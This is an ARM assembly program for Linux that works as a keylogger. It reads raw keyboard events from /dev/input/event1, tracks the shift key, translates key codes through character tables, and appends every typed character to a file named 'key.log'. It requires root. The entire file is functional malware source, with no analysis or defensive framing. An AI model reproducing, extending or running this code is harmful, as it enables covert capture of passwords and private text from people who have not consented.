.global _start

.section .text
_start:
	@ open destination file
	MOV R7, #5
	LDR R0, =dest
	LDR R1, =02101
	MOV R2, #420
	SWI #0
	MOV R11, R0

	@ open source file
	MOV R7, #5
	LDR R0, =source
	MOV R1, #0
	SWI #0
	MOV R12, R0

	@ check root privileges for reading source file
	LDR R1, =0xFFFFFFF3
	CMP R0, R1
	BEQ error

loop:
	@ get next input event
	MOV R7, #3
	MOV R0, R12
	LDR R1, =input_event
	MOV R2, #16
	SWI #0

	@ save input.type
	LDR R0, =input_event
	LDR R0, [R0, #8]
	LDR R1, =0xFFFF
	AND R0, R0, R1

	@ skip if input.type == 0
	CMP R0, #0
	BEQ loop

	@ skip if input.type == 4
	CMP R0, #4
	BEQ loop

	@ save input.value
	LDR R0, =input_event
	LDR R0, [R0, #12]

	@ skip if input.value == 0 (release)
	CMP R0, #0
	BEQ checkShiftRelease
	B skipShiftReleaseCheck

checkShiftRelease:
	LDR R0, =input_event
	LDR R0, [R0, #10]
	AND R0, R0, R1

	CMP R0, #42
	BEQ releaseShift

	CMP R0, #54
	BEQ releaseShift
	B loop

releaseShift:
	LDR R9, =shift
	MOV R8, #0
	STR R8, [R9]
	B loop

skipShiftReleaseCheck:
	@ save input code (key)
	LDR R0, =input_event
	LDR R0, [R0, #10]
	AND R0, R0, R1

	@ check if key is a shift
	CMP R0, #42
	BEQ setShift

	CMP R0, #54
	BEQ setShift
	B checkShiftSet

setShift:
	LDR R9, =shift
	MOV R8, #1
	STR R8, [R9]
	B loop

checkShiftSet:
	LDR R9, =shift
	LDR R8, [R9]
	AND R8, R8, #1
	CMP R8, #0
	BEQ lower

upper:
	LDR R1, =uppercase
	LDR R0, [R1, R0]
	B write

lower:
	LDR R1, =lowercase
	LDR R0, [R1, R0]

write:
	AND R0, R0, #0xFF
	MOV R10, R0
	LDR R9, =character
	STR R10, [R9]

	MOV R7, #4
	MOV R0, R11
	LDR R1, =character
	MOV R2, #1
	SWI #0

	B loop

_end:
	MOV R7, #1
	SWI #0

error:
	MOV R7, #4
	MOV R0, #2
	LDR R1, =errMsg
	LDR R2, =lenErrMsg
	SWI #0
	B _end

.section .data
	dest: .asciz "key.log"
	source: .asciz "/dev/input/event1"

	lowercase: .ascii "??1234567890-=\b\tqwertyuiop[]\n?asdfghjkl;'`?\\zxcvbnm,./?*? ?????????????"
		   .ascii "789-456+1230.????????????\n?/??????????????????????????????????????????????"
	uppercase: .ascii "??!@#$%^&*()_+??QWERTYUIOP{}\n?ASDFGHJKL:\"~?|ZXCVBNM<>????????????????????"

	errMsg: .asciz "Error: Program must be ran as root.\n"
	lenErrMsg = .-errMsg

	input_event: .fill 16, 1, 0
	character: .byte 0
	.align 4
	shift: .byte 0
